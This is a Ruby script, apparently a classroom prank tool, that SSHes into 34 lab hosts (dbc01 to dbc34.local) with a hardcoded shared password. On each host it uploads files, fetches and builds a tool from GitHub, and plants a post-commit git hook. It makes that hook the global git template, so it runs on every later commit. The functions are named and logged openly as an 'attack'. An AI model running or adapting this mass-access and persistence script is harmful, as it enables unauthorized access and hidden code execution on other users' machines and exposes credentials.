require 'net/ssh'
require 'net/scp'
require 'rye'

$home_path = "/users/Apprentice"
$git_templates_path = "#{$home_path}/.git-templates"
$git_hooks_path = "#{$git_templates_path}/hooks"
$assets_path = "#{$home_path}/.gittack"

def install_zorak(box)
  box.mkdir("#{$assets_path}") if box.ls($assets_path).code == 1
  box.file_upload("payloads/zorak.png", "#{$assets_path}/zorak.png")
end

def install_more_you_know(box)
  box.mkdir("#{$assets_path}") if box.ls($assets_path).code == 1
  box.file_upload("payloads/more-you-know.png", "#{$assets_path}/more-you-know.png")
end

def install_imageleap(box)
  find_result = box.mdfind("imageleap")
  if find_result.code == 0 and find_result.stdout.to_s == ""
    box.mkdir("#{$assets_path}") if box.ls($assets_path).code == 1
    box.cd("#{$assets_path}")
    box.execute("git clone https://github.com/daytonn/imageleap.git") if box.ls("#{$assets_path}/imageleap").code == 1
    box.cd("imageleap")
    box.make
    box.make("install")
  end
end

def install_post_commit(box, file = "all-your-base.rb")
  box.mkdir("#{$git_templates_path}") if box.ls("#{$git_templates_path}").code == 1
  box.mkdir("#{$git_hooks_path}") if box.ls("#{$git_hooks_path}").code == 1
  box.execute("mv #{$git_hooks_path}/post-commit #{$git_hooks_path}/post-commit.backup-#{DateTime.now}") if box.ls("#{$git_hooks_path}/post-commit").code == 0
  box.file_upload("payloads/#{file}", "#{$git_hooks_path}/post-commit")
  box.execute("chmod a+x #{$git_hooks_path}/post-commit")
end

def configure_githooks(box)
  box.execute("git config --global init.templatedir #{$git_templates_path}")
end

def attack(box)
  install_zorak(box)
  install_imageleap(box)
  install_post_commit(box)
  configure_githooks(box)
end

# Computers numbered 1 through 34
dbc_hosts = (1..34).map{ |number| "dbc%02d.local" % number }
user = 'apprentice'
password = 'mvclover'

dbc_hosts.each do |dbc_host|
  begin
    box = Rye::Box.new(dbc_host, user: user, safe: false, password: password, password_prompt: false, quiet: true)
    puts "Attacking #{box.host}..."
    install_more_you_know(box)
    install_post_commit(box, "more-you-know.rb")
    puts "Done Attacking #{box.host}."
    puts
  rescue
    puts "Could not attack #{box.host}"
    puts
    next
  end
end




